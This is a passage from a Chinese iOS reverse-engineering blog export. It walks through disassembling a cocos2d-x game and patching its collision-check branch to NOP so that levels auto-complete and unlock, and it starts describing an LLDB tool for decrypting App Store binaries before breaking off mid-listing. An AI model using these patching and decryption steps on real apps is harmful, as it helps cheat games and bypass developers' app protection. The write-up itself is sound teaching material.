[{"title":"cocos2d-x游戏逆向分析实践","date":"2019-10-17T11:53:11.000Z","path":"2019/10/17/cocos2d-x-game-re/cocos2d-x-game-re/","text":"cocos2d-x游戏逆向分析实践 本文将以一款简单的cocos2d-x的iOS版游戏《PassItThough》来进行简单的逆向分析以及外挂编写 如何下手？这是我分析的第一个cocos2d-x的游戏，也是我第一次分析游戏。就我目前的搜索到的资料来看，关于cocos2d-x游戏的逆向分析文章可以说几乎没有，所以我准备写一篇自己在分析cocos2d-x游戏过程中的一些理解和技巧。如何下手确实是我或者大多数刚进行游戏分析的最关键的问题。我会尽可能的描述清楚我从对游戏一无所知到最后成功破解一个游戏的过程，从我学习cocos2d-x游戏框架到最终破解完成耗时差不多6天时间，在这些时间里面前面4天都主要在学习cocos2d-x这个游戏引擎，后面对《PassItThough》游戏的逆向破解反而只用了两天，这里我要说明的一点在于，只有你对这个引擎或者框架足够熟悉了解以后才能有方向的进行逆向，瞎猜或者乱撞运气好可能会成功，但我坚持的观点是逆向不是全靠猜的，而是有方向的。所以如果在看这篇文章之前对cocosd-x这个游戏引擎还不熟悉的话，建议先学习一下这个引擎之后再回来看这篇文章。 游戏介绍这是一个十分简单的游戏，如下所示 游戏玩法就是拖动红环到另一端即可进入下一关，默认只有过关以后才能进入下一关，其他关卡都是没有解锁的。但是在拖动过程之中不能触碰到海草，一旦触碰就会游戏失败。 这里有两种破解选择： 忽略海草触碰，不触发游戏失败 解锁关卡，使其能够玩后面的关卡 逆向分析思路先说结果，我最终实现的是解锁关卡，再进入一个关卡的时候直接游戏通关，能够解锁下一个关卡。 由于cocos2d-x是c++编写的游戏，在进行逆向的时候如果没有目的盲目的分析，你可能会怀疑人生，拖到ida里面会发现没有函数符号，全是指针偏移等，可以说无从下手。在这里，我们还是从最终目的出发，假设我们想实现触碰海草不会触发游戏失败的外挂，这里应该怎么思考实现这个功能呢？ 从我学习cocos2d-x的经验来看，这里需要解决的是如何找到碰撞检测函数，一旦我们找到的话直接patch掉这个函数不就可以实现目的了吗？但是怎么去找这个函数还是十分麻烦的，我的想法是可能这个函数在点击和拖动事件的回调之中，也就是在拖动的过程中去判断环和海草是否碰撞。那么接下来的问题就是怎么找到拖动的回调函数？ 熟悉cocos2d-x就知道，一般实现逻辑就是在Scene中注册点击事件回调函数来处理屏幕中的点击事件，通常的代码如下： void HelloWorld::registerWithTouchDispatcher() { auto touchListener = EventListenerTouchOneByOne::create(); touchListener-&gt;onTouchBegan = CC_CALLBACK_2(HelloWorld::onTouchBegan, this); touchListener-&gt;onTouchMoved = CC_CALLBACK_2(HelloWorld::onTouchMoved, this); touchListener-&gt;onTouchEnded = CC_CALLBACK_2(HelloWorld::onTouchEnded,this); _eventDispatcher-&gt;addEventListenerWithSceneGraphPriority(touchListener, this); this-&gt;schedule(schedule_selector(HelloWorld::updatePoint)); } bool HelloWorld::onTouchBegan(Touch *touch, Event*event) { CCLOG(&quot;touch Began.&quot;); return true; } void HelloWorld::onTouchMoved(Touch *touch, Event*event) { CCLOG(&quot;touch moved.&quot;); // 这里编写碰撞逻辑 } void HelloWorld::onTouchEnded(Touch *touch, Event*event) { CCLOG(&quot;touch ended.&quot;); } 将registerWithTouchDispatcher函数放到Scene的create函数或init函数即可。虽然游戏的符号都是strip的，但是我们还是可以通过C++虚函数表能够拿到一些类的信息，这里我们就去ida中搜索EventListenerTouchOneByOne 会得到如下结果 __const:00000001005DD670 ; `vtable for&#39;cocos2d::EventListenerTouchOneByOne __const:00000001005DD670 _ZTVN7cocos2d26EventListenerTouchOneByOneE DCQ 0 ; offset to this __const:00000001005DD678 DCQ _ZTIN7cocos2d26EventListenerTouchOneByOneE ; `typeinfo for&#39;cocos2d::EventListenerTouchOneByOne __const:00000001005DD680 off_1005DD680 DCQ sub_100344E10 ; DATA XREF: sub_100344D24+10↑o __const:00000001005DD680 ; sub_100344D24+14↑o ... __const:00000001005DD688 DCQ sub_100344E14 __const:00000001005DD690 DCQ sub_100344FAC __const:00000001005DD698 DCQ sub_100344FBC 这里直接看第一个虚函数的交叉引用，因为如果熟悉c++逆向的话就知道，在初始化一个类的时候，紧接着就会将第一个地址出写入虚函数地址表首项地址。拿到了初始化代码的位置，再进行一次交叉引用就能拿到调用这个类的位置。这里第一次交叉引用得到如下 _QWORD *EventListenerTouchOneByOne::create() { __int64 v0; // x0 _QWORD *v1; // x19 v0 = operator new(256LL, &amp;std::nothrow); v1 = (_QWORD *)v0; if ( v0 ) { sub_1003B8154(v0); *v1 = off_1005DD6B0; v1[19] = 0LL; v1[23] = 0LL; v1[27] = 0LL; v1[31] = 0LL; if ( (unsigned int)sub_1003452D4(v1) ) { sub_1003C8778((__int64)v1); } else { (*(void (__fastcall **)(_QWORD *))(*v1 + 8LL))(v1); v1 = 0LL; } } return v1; 这里的off_1005DD6B0就是虚函数表首地址，可以明显的看出来这是EventListenerTouchOneByOne的构造函数。（所以一些启示就是如果一个类有虚函数，那么在new内存之后马上就会设置虚函数表，所以可以根据此来找到关键代码），找到了构造函数那么我们在进行一次交叉引用去拿到调用的位置 v273 = EventListenerTouchOneByOne::create(v272); *(_OWORD *)v304 = (unsigned __int64)sub_1000155BC; v305 = v1; sub_1000158F0(v273 + 128, v304); *(_OWORD *)v304 = (unsigned __int64)sub_1000159AC; v305 = v1; sub_1000158F0(v273 + 192, v304); *(_OWORD *)v304 = (unsigned __int64)sub_1000159FC; v305 = v1; sub_1000158F0(v273 + 160, v304); *(_OWORD *)v304 = (unsigned __int64)sub_100015BE8; 这里我们就知道了那个函数就是EventListenerTouchOneByOne::create，所以我对其进行了重命名。再观察下面的代码以及和前面EventListenerTouchOneByOne的代码一结合就知道下面应该是在设置touch的事件，这里有一个比较快速的方法知道点击事件对应的方法，通过对下面的几个函数下断点，然后点击屏幕看断点的触发顺序知道分别对应的点击函数，这里我得到的如下 v273 = EventListenerTouchOneByOne::create(v272); *(_OWORD *)v304 = (unsigned __int64)onTouchMoved; v305 = v1; sub_1000158F0(v273 + 128, v304); *(_OWORD *)v304 = (unsigned __int64)onTouchEnded; v305 = v1; sub_1000158F0(v273 + 192, v304); *(_OWORD *)v304 = (unsigned __int64)onTouchBegan; v305 = v1; sub_1000158F0(v273 + 160, v304); *(_OWORD *)v304 = (unsigned __int64)j_onTouchBegan; 那么我们现在分析哪一个函数呢，直接点进去分析逆向分析还是很困难，必须缩小范围。接下来我将介绍一种技巧去找到关键函数。 游戏的代码虽然是没有符号的，但是一般资源文件是明文的，我们可以解包以后得到资源，再结合界面信息很容易去找到资源名，然后再ida中搜索资源的代码调用位置就能拿到一些线索。由于这个游戏拖动的是下面的拖动按钮。解包以后发现资源为handle.png在ida中搜索得到以下 __cstring:000000010051314F ; sub_100012134+185C↑o ... __cstring:0000000100513168 aCommonRing2Png DCB &quot;common/ring2.png&quot;,0 __cstring:0000000100513168 ; DATA XREF: sub_100012134:loc_100013A3C↑o __cstring:0000000100513168 ; sub_100012134+190C↑o ... __cstring:0000000100513179 aCommonRingUp2P DCB &quot;common/ring_up2.png&quot;,0 __cstring:0000000100513179 ; DATA XREF: sub_100012134+1B20↑o __cstring:0000000100513179 ; sub_100012134+1B24↑o ... __cstring:000000010051318D aCommonHandlePn DCB &quot;common/handle.png&quot;,0 __cstring:000000010051318D ; DATA XREF: sub_100012134+1EBC↑o __cstring:000000010051318D ; sub_100012134+1EC0↑o ... __cstring:000000010051319F aCommonWinPanel DCB &quot;common/win_panel.png&quot;,0 然后交叉引用得到如下 sub_100014CA8(v303, &quot;common/handle.png&quot;); v225 = sub_10039FAD4((__int64)v303); *(_QWORD *)(v1 + 1120) = v225; if ( SHIBYTE(v304) &amp; 0x80000000 ) { operator delete(v303[0]); v225 = *(_QWORD *)(v1 + 1120); } sub_1000062CC(v225); v226 = *(_QWORD *)(v1 + 1120); (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v226 + 136LL))(*(_QWORD *)(v1 + 1120)); (*(void (__fastcall **)(__int64))(*(_QWORD *)v226 + 128LL))(v226); v227 = *(_QWORD *)(v1 + 1120); *(float *)v303 = (float)(*(float *)&amp;dword_1006DDC94 * 30.0) * *(float *)&amp;dword_1006DDCAC; *((float *)v303 + 1) = *((float *)&amp;qword_1006DDC9C + 1) * 0.37; (*(void (__cdecl **)(__int64, void **, __int64, __int64))(*(_QWORD *)v227 + 152LL))(v227, v303, v228, v229); (*(void (__fastcall **)(__int64, _QWORD, signed __int64))(*(_QWORD *)v1 + 528LL))( v1, *(_QWORD *)(v1 + 1120), 4LL); 稍加分析就发现，就是将common/handle.png图片初始化为Sprite，也就是说那个按钮就是一个Sprite类，像这种类一般肯定会在Scene中保存其引用也就是这行代码 *(_QWORD *)(v1 + 1120) = v225; 分析这个的原因在于，我们可以去全局搜索调用这个类成员变量的位置，一般对其引用的就是关键代码。但是这里不能直接搜索，只能搜索汇编代码，所以得到这个类对象的汇编代码如下 __text:0000000100013FF0 ADRP X1, #aCommonHandlePn@PAGE ; &quot;common/handle.png&quot; __text:0000000100013FF4 ADD X1, X1, #aCommonHandlePn@PAGEOFF ; &quot;common/handle.png&quot; __text:0000000100013FF8 ADD X0, SP, #0x160+var_100 __text:0000000100013FFC BL sub_100014CA8 __text:0000000100014000 ADD X0, SP, #0x160+var_100 __text:0000000100014004 BL sub_10039FAD4 __text:0000000100014008 STR X0, [X19,#0x460] // 关键点 __text:000000010001400C LDRSB W8, [SP,#0x160+anonymous_0+7] __text:0000000100014010 TBZ W8, #0x1F, loc_100014020 __text:0000000100014014 LDR X0, [SP,#0x160+var_100] ; void * __text:0000000100014018 BL __ZdlPv ; operator delete(void *) 这个地址00100014008就是我们需要的代码，x0就是Sprite，保存到Scene的0x460偏移处。既然如此，我们全局搜索#0x460这个偏移，我是写的一个简单的ida Python脚本搜索得到如下结果 ----------------- [xda] search-dism-str ---------------- 0x100014008 STR X0, [X19,#0x460] sub_100012134 0x10001401c LDR X0, [X19,#0x460] sub_100012134 0x100014024 LDR X20, [X19,#0x460] sub_100012134 0x10001404c LDR X0, [X19,#0x460] sub_100012134 0x100014084 LDR X1, [X19,#0x460] sub_100012134 0x10001560c LDR X0, [X19,#0x460] sub_1000155BC // 点击回调函数 0x100015644 LDR X0, [X19,#0x460] sub_1000155BC 0x100015a54 LDR X0, [X19,#0x460] sub_1000159FC // 点击回调函数 0x100015ad4 LDR X0, [X19,#0x460] sub_1000159FC 0x100017564 LDR X20, [X19,#0x460] sub_1000174DC 0x100017e3c LDR X0, [X19,#0x460] sub_100017A18 0x100017ec0 LDR X0, [X19,#0x460] sub_100017A18 0x100019bbc STR X0, [X19,#0x460] sub_10001934C 0x100019bd0 LDR X20, [X19,#0x460] sub_10001934C 0x100019c00 LDR X0, [X19,#0x460] sub_10001934C 0x100019c28 LDR X1, [X19,#0x460] sub_10001934C 0x100019c40 LDR X0, [X19,#0x460] sub_10001934C 0x10001be20 LDR X1, [X19,#0x460] sub_10001BDBC 0x10001bf9c LDR X0, [X19,#0x460] sub_10001BDBC 0x100380a18 STR S0, [X19,#0x460] sub_10038095C 0x100381c70 LDR S2, [X19,#0x460] sub_100381BB0 0x100381cc4 LDR S2, [X19,#0x460] sub_100381BB0 0x10039b588 LDR S0, [X19,#0x460] sub_10039B540 0x1003a00b4 STR XZR, [X19,#0x460] sub_1003A0024 0x1003ead04 LDR X8, [X19,#0x460] sub_1003EACC4 0x1003eb58c LDR X8, [X19,#0x460] sub_1003EB560 0x10042a690 STR W10, [X19,#0x460] sub_10042A5D8 0x10042a698 LDR W10, [X19,#0x460] sub_10042A5D8 0x100458c48 STR XZR, [X19,#0x460] sub_100458B74 -------------------------------------------------------- 结合之前那几个点击函数，会发现有两处相同的函数，即上面的回调函数。经过分析发现就是onTouchMoved和onTouchBegan对Sprite进行了引用。这也很合理，在这两个时间中肯定会对该Sprite进行操作。所以接下来重点分析这两个函数。不过我对其进行大量分析和调试发现，这两个函数中并没有进行碰撞检测。由于对游戏开发不熟悉，如果不是在拖动事件函数中检测，那又会在哪里检测呢？ 换个思路前面说到检测碰撞的函数并不在拖动事件函数中，那还可能是怎么检测碰撞的呢？想象一下可能是用一个线程去循环检测是否发生碰撞以及游戏是否结束的。那我们又应该怎么去分析呢？虽然检测是在单独的线程之中，但检测碰撞本身肯定需要对环本身操作，所以用上面同样的方法去找到环的代码调用位置。 环初始化位置 sub_100014CA8(v303, &quot;common/ring2.png&quot;); v145 = sub_10039FAD4((__int64)v303); if ( SHIBYTE(v304) &amp; 0x80000000 ) operator delete(v303[0]); v146 = (_QWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v145 + 360LL))(v145); sub_1003A9470(&amp;v299, v146); sub_100014CA8(v303, &quot;common/ring2.png&quot;); sub_1003A9500(&amp;v301); v147 = sub_10039FB6C((__int64)v303, (__int64)&amp;v301); v148 = (__int64 *)(v1 + 824); *(_QWORD *)(v1 + 824) = v147; 根据如下代码拿到在Scene中的偏移 __text:0000000100013ABC STR X0, [X19,#0x338] 然后用脚本去搜索 ----------------- [xda] search-dism-str ---------------- 0x100009138 MOV W0, #0x338 sub_100009124 0x100009148 MOV W1, #0x338; size_t sub_100009124 0x100013ab8 ADD X26, X19, #0x338 sub_100012134 0x100013abc STR X0, [X19,#0x338] sub_100012134 0x100013b6c LDR X1, [X19,#0x338] sub_100012134 0x100013c18 LDR X0, [X19,#0x338] sub_100012134 0x100013eb0 LDR X21, [X19,#0x338] sub_100012134 0x1000150c4 LDR X21, [X19,#0x338] sub_100015064 0x100015100 LDR X21, [X19,#0x338] sub_100015064 0x1000151b0 LDR X20, [X19,#0x338] sub_100015064 0x100015240 LDR X0, [X19,#0x338] sub_100015064 0x100015258 LDR X0, [X19,#0x338] sub_100015064 0x10001526c LDR X0, [X19,#0x338] sub_100015064 0x100015284 LDR X0, [X19,#0x338] sub_100015064 0x100015b14 LDR X0, [X19,#0x338] onTouchBegan 0x100015b2c LDR X21, [X19,#0x338] onTouchBegan 0x100015b68 LDR X21, [X19,#0x338] onTouchBegan 0x1000175e8 LDR X20, [X19,#0x338] sub_1000174DC 0x100017614 LDR X21, [X19,#0x338] sub_1000174DC 0x100017650 LDR X21, [X19,#0x338] sub_1000174DC 0x100017a3c LDR X21, [X0,#0x338] sub_100017A18 0x100017a78 LDR X21, [X19,#0x338] sub_100017A18 0x100017e1c LDR X0, [X19,#0x338] sub_100017A18 0x100017e5c LDR X0, [X19,#0x338] sub_100017A18 0x100017ea0 LDR X0, [X19,#0x338] sub_100017A18 0x100017f08 LDR X1, [X19,#0x338] sub_100017A18 0x10001a0a8 STR X0, [X19,#0x338] sub_10001934C 0x10001a0bc LDR X0, [X19,#0x338] sub_10001934C 0x10001a0c4 LDR X0, [X19,#0x338] sub_10001934C 0x10001a0dc LDR X20, [X19,#0x338] sub_10001934C 0x10001a104 LDR X20, [X19,#0x338] sub_10001934C 0x10001a12c LDR X1, [X19,#0x338] sub_10001934C 0x10001bc2c LDR X20, [X19,#0x338] sub_10001BBA0 0x10001bec8 LDR X20, [X19,#0x338] sub_10001BDBC 0x10001bf10 LDR X26, [X19,#0x338] sub_10001BDBC 0x10001c100 LDR X20, [X19,#0x338] sub_10001C05C 0x10001d2a8 LDR X0, [X19,#0x338] sub_10001D244 0x10001d50c LDR X0, [X20,#0x338] sub_10001D44C 0x1002fa0b8 STR W9, [X0,#0x338] sub_1002F4438 0x1002fd610 LDR W9, [X0,#0x338] sub_1002FB588 0x1002fd624 STR W9, [X0,#0x338] sub_1002FB588 0x1002fd634 LDR W10, [X0,#0x338] sub_1002FB588 0x1002fd640 STR W9, [X0,#0x338] sub_1002FB588 0x1002fdfe4 LDR W9, [X0,#0x338] sub_1002FB588 0x10030ba80 STR W9, [X0,#0x338] sub_100309854 0x10030ba90 LDR W10, [X0,#0x338] sub_100309854 0x10030d1f4 LDR W9, [X0,#0x338] sub_100309854 0x10031115c LDR W9, [X0,#0x338] sub_100310914 0x100311170 STR W9, [X0,#0x338] sub_100310914 0x100311180 LDR W10, [X0,#0x338] sub_100310914 0x100311198 LDR W9, [X0,#0x338] sub_100310914 0x1003111ec LDR W9, [X0,#0x338] sub_100310914 0x100311204 STR W9, [X0,#0x338] sub_100310914 0x100311214 LDR W10, [X0,#0x338] sub_100310914 0x100311220 STR W9, [X0,#0x338] sub_100310914 0x100311230 LDR W10, [X0,#0x338] sub_100310914 0x10031123c STR W9, [X0,#0x338] sub_100310914 0x10031124c LDR W10, [X0,#0x338] sub_100310914 0x100311258 STR W9, [X0,#0x338] sub_100310914 0x100311268 LDR W10, [X0,#0x338] sub_100310914 0x100311274 STR W9, [X0,#0x338] sub_100310914 0x100311284 LDR W10, [X0,#0x338] sub_100310914 0x100311290 STR W9, [X0,#0x338] sub_100310914 0x100311298 LDR W9, [X0,#0x338] sub_100310914 0x10034bdd0 LDR X8, [X8,#0x338] sub_10034BD50 0x1003597dc LDR X8, [X8,#0x338] sub_1003597B0 0x10035991c LDR X8, [X8,#0x338] sub_1003598E8 0x10035a044 LDR X8, [X8,#0x338] sub_100359FEC 0x10037eae4 STR XZR, [X19,#0x338] sub_10037EA34 0x10038d3d8 MOV W0, #0x338 sub_10038D280 0x100392094 LDR X8, [X8,#0x338] sub_100392040 0x100392288 STRB W8, [X20,#0x338] sub_100392220 0x1003987d4 STR XZR, [X19,#0x338] sub_10039872C 0x1003989f4 LDR X0, [X0,#0x338] sub_1003989D8 0x100398ec0 LDR X0, [X19,#0x338] sub_100398C24 0x100398ed0 LDR X0, [X19,#0x338] sub_100398C24 0x100398ee8 LDR X0, [X19,#0x338] sub_100398C24 0x100398f18 LDR X1, [X19,#0x338] sub_100398C24 0x10039906c LDR X0, [X20,#0x338] sub_10039904C 0x100399078 STR X19, [X20,#0x338] sub_10039904C 0x1003994d0 LDR X0, [X20,#0x338] sub_100399474 0x1003998a8 LDR X8, [X19,#0x338] sub_10039980C 0x10039aaa0 ADD X22, X19, #0x338 sub_10039AA54 0x10039ac48 ADD X0, X19, #0x338 sub_10039ABE8 0x10039acf8 ADD X20, X19, #0x338 sub_10039ACD4 0x1003e42b0 LDR X1, [X19,#0x338] sub_1003E41CC 0x1003e42bc STR XZR, [X19,#0x338] sub_1003E41CC 0x100406318 LDR X8, [X19,#0x338] sub_1004062EC 0x100407328 STR X8, [X0,#0x338] sub_10040728C 0x100407458 STR X9, [X0,#0x338] sub_100407368 0x100408428 LDR X8, [X19,#0x338] sub_100407990 0x100409c1c LDR X8, [X19,#0x338] sub_100409B58 0x10041265c LDR X8, [X20,#0x338] sub_10041000C 0x100414318 STR X8, [X19,#0x338] sub_1004141E0 0x1004217f4 STR X8, [X19,#0x338] sub_100421714 0x100423de0 STR X8, [X19,#0x338] sub_100423D34 0x10042a724 STR W8, [X19,#0x338] sub_10042A5D8 0x10042aa04 ADD X9, X27, #0x338 sub_10042A8A4 0x10042b548 LDR W13, [X19,#0x338] sub_10042B1AC 0x100468170 STR X8, [X20,#0x338] sub_1004678F0 0x10046a948 LDR X10, [X19,#0x338] sub_100468D4C 0x10046a964 LDR X9, [X19,#0x338] sub_100468D4C 0x10046ede4 LDR X9, [X19,#0x338] sub_10046ECA0 0x10046fda0 STR X8, [X19,#0x338] sub_10046FCB8 0x10047dedc ADD X8, X8, #0x338 sub_10047DE00 0x10047e030 ADD X8, X8, #0x338 sub_10047DE00 0x10047e380 ADD X2, X2, #0x338 sub_10047DE00 0x10047e9d8 ADD X2, X2, #0x338 sub_10047DE00 0x100480438 ADD X2, X2, #0x338 sub_10047DE00 0x1004844a8 MOV W1, #0x338; size_t sub_10048445C 0x1004845cc MOV W1, #0x338; size_t sub_10048445C 0x1004847f4 LDR X11, [X21,#0x338] sub_1004846C4 0x100484a9c LDR X23, [X19,#0x338] sub_100484A64 0x100484e58 LDR X20, [X19,#0x338] sub_100484E30 0x100484fd0 LDR X21, [X20,#0x338] sub_100484FA4 0x100485088 LDR X22, [X19,#0x338] sub_100485058 0x10048ede8 STR X10, [X19,#0x338] sub_10048EC38 0x10049c594 LDR W13, [X1,#0x338] sub_10049BAAC 0x10049cdf8 ADD X25, X20, #0x338 sub_10049CCA8 0x10049d50c LDR W12, [X21,#0x338] sub_10049D46C 0x10049dd94 ADD X22, X20, #0x338 sub_10049DBDC 0x10049df1c STR WZR, [X8,#0x338] sub_10049DF08 -------------------------------------------------------- 这里得到的结果有好多处，但其实没多少函数，我们对这些函数下断点。会发现总会断在如下位置 ==========================================xia0LLDB=========================================== BlockSymbolFile Not Set The Block Symbol Json File, Try &#39;sbt -f&#39; ============================================================================================= frame #0: [file:0x100017a18 mem:0x10215ba18] PassItThrough-mobile`Maybe c function? Distance:53664 &gt;= 2500 # Symbol:-[RootViewController didReceiveMemoryWarning] + 53664 frame #1: [file:0x100343c44 mem:0x102487c44] PassItThrough-mobile`Maybe c function? Distance:28352 &gt;= 2500 # Symbol:-[CDSoundEngineFader _allowableType] + 28352 frame #2: [file:0x10034bb48 mem:0x10248fb48] PassItThrough-mobile`Maybe c function? Distance:60868 &gt;= 2500 # Symbol:-[CDSoundEngineFader _allowableType] + 60868 frame #3: [file:0x10034d1e4 mem:0x1024911e4] PassItThrough-mobile`Maybe c function? Distance:66656 &gt;= 2500 # Symbol:-[CDSoundEngineFader _allowableType] + 66656 frame #4: [file:0x18540b058 mem:0x1d1e9b058] QuartzCore`CA::Display::DisplayLink::dispatch_items(unsigned long long, unsigned long long, unsigned long long) + 808 frame #5: [file:0x1854d49cc mem:0x1d1f649cc] QuartzCore`display_timer_callback(__CFMachPort*, void*, long, void*) + 276 frame #6: [file:0x180e14a94 mem:0x1cd8a4a94] CoreFoundation`__CFMachPortPerform + 192 frame #7: [file:0x180e3d0ec mem:0x1cd8cd0ec] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 60 frame #8: [file:0x180e3c7f4 mem:0x1cd8cc7f4] CoreFoundation`__CFRunLoopDoSource1 + 444 frame #9: [file:0x180e37384 mem:0x1cd8c7384] CoreFoundation`__CFRunLoopRun + 2088 frame #10: [file:0x180e36844 mem:0x1cd8c6844] CoreFoundation`CFRunLoopRunSpecific + 452 frame #11: [file:0x1830e5be8 mem:0x1cfb75be8] GraphicsServices`GSEventRunModal + 104 frame #12: [file:0x1ae78431c mem:0x1fb21431c] UIKitCore`UIApplicationMain + 216 frame #13: [file:0x10000cc00 mem:0x102150c00] PassItThrough-mobile`main + 56 frame #14: [file:0x1808ec020 mem:0x1cd37c020] libdyld.dylib`start + 4 从堆栈上分析来看，这应该是一个timer事件，也就是会循环执行的一个函数，当游戏进入Scene以后这个函数就会一直循环执行。应该就是我们想找的函数了，接下来就重点分析0x100017a18这个函数。 在分析前，为了更加确实是检测碰撞的函数，我在调试器中动态patch了第一条指令改为ret。发现就算环和海草碰撞甚至脱到外面游戏也不会失败。验证了我们的猜想，但是由于把整个函数干掉了，所以就算拖到末尾也不会游戏通关。所以还得进一步分析，最终我找到一个patch点 __text:0000000100017C50 FMUL S2, S2, S3 __text:0000000100017C54 FADD S1, S1, S2 __text:0000000100017C58 FCMP S0, S1 __text:0000000100017C5C B.GT loc_100017C88 __text:0000000100017C60 LDR X0, [X19,#0x340] __text:0000000100017C64 LDR X8, [X0] __text:0000000100017C68 LDR X8, [X8,#0xE0] __text:0000000100017C6C BLR X8 __text:0000000100017C70 LDR S1, [X19,#0x5D0] __text:0000000100017C74 LDR S2, [X21] __text:0000000100017C78 FMUL S2, S2, S8 __text:0000000100017C7C FADD S1, S1, S2 __text:0000000100017C80 FCMP S0, S1 __text:0000000100017C84 B.LE loc_100017DDC // patch 为nop __text:0000000100017C88 __text:0000000100017C88 loc_100017C88 ; CODE XREF: sub_100017A18+244↑j __text:0000000100017C88 MOV X0, X19 __text:0000000100017C8C BL sub_100357FA8 __text:0000000100017C90 MOV X0, X19 __text:0000000100017C94 BL sub_100357F94 __text:0000000100017C98 BL cocos2d__Director__getInstance__ __text:0000000100017C9C LDR X0, [X0,#0xB0] __text:0000000100017CA0 MOV W2, #0 __text:0000000100017CA4 MOV X1, X19 __text:0000000100017CA8 BL sub_1003BB150 __text:0000000100017CAC BL getUserDefault __text:0000000100017CB0 LDR X8, [X0] __text:0000000100017CB4 LDR X8, [X8,#8] __text:0000000100017CB8 ADRP X1, #aTotalCompleteC@PAGE ; &quot;total_complete_chapter&quot; __text:0000000100017CBC ADD X1, X1, #aTotalCompleteC@PAGEOFF ; &quot;total_complete_chapter&quot; __text:0000000100017CC0 MOV W2, #0 __text:0000000100017CC4 BLR X8 __text:0000000100017CC8 STR W0, [X19,#0x5B8] __text:0000000100017CCC LDR W8, [X19,#0x5BC] __text:0000000100017CD0 ADD W8, W8, #1 __text:0000000100017CD4 STR W8, [X19,#0x5BC] 将那个位置patch为nop以后，发现游戏直接通过了，进入下一关又直接通关，回到主菜单发现后面的游戏关卡也都解锁了。有点暴力，游戏不玩就直接通关了，没啥游戏体验，但终究能够解锁后面的关卡和通关，所以也能接受了。 关于在调试中patch的代码在我写的lldb调试工具中的patcher命令 https://github.com/4ch12dy/xia0LLDB 总结这个游戏算是比较完整的分析完了，在这过程之中，学习到了很多，也发现了与一般app逆向的区别。由于是C++代码，使得逆向分析十分困难，只能用一些分析技巧才能找到关键代码。cocos2d-x引擎游戏算是游戏逆向分析里面比较麻烦的一类了，在腾讯那本游戏安全里面针对这种游戏也没有很好地逆向方法，只提及了字符串搜索，更多可能是猜的过程。但就我分析的思路来看，还是有规律和经验可循的。 Todo后面可能会做一个对于C++虚函数表恢复的插件以及编写这个游戏的外挂代码 参考 https://www.cnblogs.com/Antiver/p/10173474.html https://github.com/4ch12dy/xia0LLDB https://www.cnblogs.com/luorende/p/5988947.html https://www.cnblogs.com/Antiver/p/10173474.html https://github.com/0xgalz/Virtuailor","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"cocos2d","slug":"cocos2d","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cocos2d/"}]},{"title":"cocos2d-x引擎学习笔记","date":"2019-10-14T09:10:09.000Z","path":"2019/10/14/cocos2d-x-dev-note/cocos2d-x-dev-note/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"cocos2d-x","slug":"cocos2d-x","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cocos2d-x/"}]},{"title":"arm64中C++的逆向分析基础","date":"2019-10-14T07:33:19.000Z","path":"2019/10/14/cpp-in-iOS-arm64/cpp-in-iOS-arm64/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"arm64","slug":"arm64","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm64/"}]},{"title":"又又又又一个脱壳工具来了","date":"2019-09-22T17:12:12.000Z","path":"2019/09/23/lldb-dumpdecrypted/lldb-dumpdecrypted/","text":"又又又又一个脱壳工具来了是的，又又又又一个脱壳工具来了：LLDB调试器版本的脱壳工具 场景我能想到的场景就是最近分析一个app的时候会在mod_init_func的时候crash，这样导致现有的脱壳工具无法正常脱壳，或者之前Frida没兼容iOS12以及其他特殊场景。所以就做了LLDB中的脱壳工具。 使用由于在LLDB中脱壳的特殊性，所以这样我介绍下如何去使用这个脱壳工具 以下命令已集成到xia0LLDB或issh 以后台模式启动目标appxia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/86E712C8-84CA-49AF-B2EA-01C37395A746/WeChat.app/WeChat [*]:iproxy process for 2222 port alive, pid=1830 [*]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [*]:iOSRE dir exist [*]:iproxy process for 1234 port alive, pid=14885 [*]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [*]:/iOSRE/tools/debugserver file exist, Start debug... [*]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/86E712C8-84CA-49AF-B2EA-01C37395A746/WeChat.app/WeChat 连接到远端debugserver(lldb) pcc Process 19633 stopped thread #1, stop reason = signal SIGSTOP frame #0: 0x00000001200f5000 dyld`_dyld_start dyld`_dyld_start: 0x1200f5000 &lt;+0&gt;: mov x28, sp 0x1200f5004 &lt;+4&gt;: and sp, x28, #0xfffffffffffffff0 0x1200f5008 &lt;+8&gt;: mov x0, #0x0 0x1200f500c &lt;+12&gt;: mov x1, #0x0 0x1200f5010 &lt;+16&gt;: stp x1, x0, [sp, #-0x10]! 0x1200f5014 &lt;+20&gt;: mov x29, sp 0x1200f5018 &lt;+24&gt;: sub sp, sp, #0x10 ; =0x10 0x1200f501c &lt;+28&gt;: ldr x0, [x28] Target 0: (dyld) stopped. 一些断点设置情况(lldb) b getpid Breakpoint 1: no locations (pending). WARNING: Unable to resolve breakpoint to any actual locations. (lldb) c Process 19633 resuming 1 location added to breakpoint 1 Process 19633 stopped thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.1 frame #0: 0x0000000181ceb570 libsystem_kernel.dylib getpid libsystem_kernel.dylib getpid: 0x181ceb570 &lt;+0&gt;: adrp x9, 124120 0x181ceb574 &lt;+4&gt;: add x9, x9, #0x90 ; =0x90 0x181ceb578 &lt;+8&gt;: ldr w0, [x9] 0x181ceb57c &lt;+12&gt;: cmp w0, #0x0 ; =0x0 0x181ceb580 &lt;+16&gt;: b.ls 0x181ceb588 ; &lt;+24&gt; 0x181ceb584 &lt;+20&gt;: ret 0x181ceb588 &lt;+24&gt;: mov 